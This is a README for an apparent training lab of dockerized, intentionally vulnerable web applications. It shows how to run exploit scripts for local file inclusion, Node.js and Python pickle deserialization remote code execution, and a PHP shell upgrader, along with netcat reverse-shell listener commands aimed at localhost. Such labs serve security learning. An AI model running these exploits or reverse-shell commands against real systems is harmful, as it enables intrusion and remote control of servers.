# vulnhub

## Description

This project is some dockerized web applications that has any known vurnerability and a example on 
how to exploit them.

## Usage

Start all vurnerable docker containers

```sh
   docker-compose up -d
```

## lfi-php5 

Example on how to exploit this container.\
This command is an example on how to loot serverside files that normally will not be able to browse or download by use a LFI (local file inclusion) 

```sh
lfi-loot.py -f index.php -g file -u http://localhost:8080
``` 

##  nodejs-deserialization

Example on how to exploit this container.

```sh
nc -nlvp 1337
./nodejs_deser_rce_nc.py http://localhost:3000 127.0.0.1 1337
```
Same exploit with listener build in so no netcat listener needed.
```sh
./nodejs_deser_rce.py http://localhost:3000 127.0.0.1 1337
```

##  pypickle-deserialization

Example on how to exploit this container.

```sh
nc -nlvp 1337
./pycpickle_deser_rce_nc.py http://localhost:5000 127.0.0.1 1337
```
Same exploit with listener build in so no netcat listener needed.
```sh
./pypicke_deser_rce.py http://localhost:5000 127.0.0.1 1337
```

##  get-php

Example on how to exploit this container.
 
```sh
shellupgrader.py http://localhost/index.php 127.0.0.1 1337
```
